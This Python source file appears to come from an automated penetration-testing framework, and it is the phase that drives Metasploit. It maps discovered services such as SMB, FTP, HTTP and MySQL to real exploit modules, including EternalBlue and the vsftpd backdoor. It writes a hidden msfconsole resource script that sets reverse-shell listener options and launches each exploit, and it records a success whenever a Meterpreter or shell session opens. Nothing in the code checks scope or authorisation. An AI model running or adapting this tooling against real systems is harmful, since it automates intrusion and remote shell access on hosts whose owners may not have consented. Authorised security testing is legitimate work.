"""Metasploit Integration Phase (Phase 2).

This phase uses the KnowledgeBase and CredentialStore to automate Metasploit exploitation.
It maps services/CVEs discovered in earlier phases to known Metasploit modules.
"""
import subprocess
import logging
from core.config import FrameworkConfig
from core.knowledge_base import Finding, ExploitLog
from core.credential_store import CredentialStore

log = logging.getLogger(__name__)

# Map known service names and common vulnerability categories to Metasploit modules
MSF_MODULE_MAP = {
    "http": [
        "exploit/multi/http/apache_struts_cve_2017_5638",
        "exploit/unix/webapp/tomcat_mgr_upload"
    ],
    "ssh": [
        "auxiliary/scanner/ssh/ssh_login",
        "exploit/linux/ssh/tunnel"
    ],
    "ftp": [
        "exploit/unix/ftp/vsftpd_234_backdoor",
        "auxiliary/scanner/ftp/anonymous"
    ],
    "smb": [
        "exploit/windows/smb/ms17_010_eternalblue",
        "auxiliary/scanner/smb/smb_ms17_010"
    ],
    "mysql": [
        "exploit/linux/mysql/mysql_yassl_getname"
    ],
    "postgres": [
        "exploit/linux/postgres/postgres_createtemplate_db"
    ]
}

class metasploit_integration:
    """Automated exploitation phase using Metasploit Framework."""

    def __init__(self, config: FrameworkConfig, kb, cred_store, prior_findings, prior_exploit_logs):
        self.config = config
        self.kb = kb; self.cred_store = cred_store
        self.prior_findings = prior_findings
        self.prior_exploit_logs = prior_exploit_logs

    def execute_task(self, task):
        """Execute a single exploitation attempt."""
        target_ip = task["target"]
        module = task["module"]
        port = task.get("port")

        log.info(f"Attempting to run Metasploit module {module} against {target_ip}")

        # Check for stored credentials specific to this target to inject as brute-force list
        creds = self.cred_store.get_credentials(target=target_ip)

        try:
            msf_result = self._run_msfconsole(module, target_ip, port, creds)

            if msf_result.get("success"):
                self.kb.add_finding(Finding(
                    phase="metasploit_integration",
                    title="Successful Exploitation via Metasploit",
                    description=f"Metasploit module {module} successfully targeted {target_ip}",
                    category="exploit",
                    severity="critical",
                    target=target_ip,
                    evidence=msf_result.get("output")
                ))
                self.kb.add_exploit_log(ExploitLog(
                    target=target_ip, technique="Metasploit", status="success", tool="msfconsole"
                ))
            else:
                self.kb.add_exploit_log(ExploitLog(
                    target=target_ip, technique="Metasploit", status="failure", tool="msfconsole"
                ))
                log.warning("Metasploit module %s failed on %s: %s", module, target_ip, msf_result.get("error"))
        except Exception as e:
            log.error(f"Error executing Metasploit module on {target_ip}: {e}")

    def _run_msfconsole(self, module_name, rhost, rport=None, creds_list=None):
        """Execute msfconsole non-interactively and return results."""
        # Verify msfconsole exists
        try:
            subprocess.run(["which", "msfconsole"], capture_output=True, check=True)
        except subprocess.CalledProcessError:
            return {"success": False, "error": "msfconsole not found in PATH."}

        rhost_cmd = f"setg RHOSTS {rhost}"
        rport_cmd = f"setg RPORT {rport}" if rport else ""
        
        # Generate payload setup (e.g., reverse_tcp on local interface)
        lhost_cmd = "setg LHOST tun0" 
        lport_cmd = "setg LPORT 4444"

        # If we have credentials, we could generate a resource script to run credential stuffing
        resource_script = f"""
use {module_name}
{rhost_cmd}
{rport_cmd}
{lhost_cmd}
{lport_cmd}
exploit -j -z 
sessions -l
exit -y
"""
        
        # Write resource file
        res_path = "/tmp/.msf_res_script.rc"
        with open(res_path, "w") as f:
            f.write(resource_script)

        log.info(f"Running Metasploit resource script for {module_name}")
        
        try:
            proc = subprocess.run(
                ["msfconsole", "-r", res_path],
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True, 
                timeout=300 # 5 minutes max per module attempt
            )
            
            output = proc.stdout + proc.stderr
            session_active = "Meterpreter" in output or "Shell" in output
            
            return {
                "success": session_active,
                "output": output[:2000] # Truncate massive msfconsole output
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Metasploit execution timed out."}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def build_task_list(self) -> list[dict]:
        """Build Metasploit tasks from discovered services (engine convention)."""
        return type(self).build_tasks(self.kb)

    @staticmethod
    def build_tasks(kb) -> list[dict]:
        """Build a list of Metasploit exploitation tasks based on KB state."""
        targets = kb.get_discovered_targets()
        if not targets:
            log.warning("No exploitable targets found to generate Metasploit tasks.")
            return []

        tasks = []
        for ip in targets:
            # Collect service names and the first observed port per service
            svc_ports: dict[str, int] = {}
            for f in kb.get_findings(target=ip, category="service"):
                svc = (f.metadata.get("service_name") or "").strip().lower()
                port = f.metadata.get("port")
                if svc and svc not in svc_ports:
                    svc_ports[svc] = port or 0

            if not svc_ports:
                continue

            for svc, port in sorted(svc_ports.items()):
                if svc in MSF_MODULE_MAP:
                    for module in MSF_MODULE_MAP[svc]:
                        tasks.append({"target": ip, "module": module, "port": port or None})
                elif svc in ("http", "https"):
                    # No dedicated mapping — run the generic version scanner
                    tasks.append({"target": ip, "module": "auxiliary/scanner/http/http_version", "port": port or 80})
        return tasks
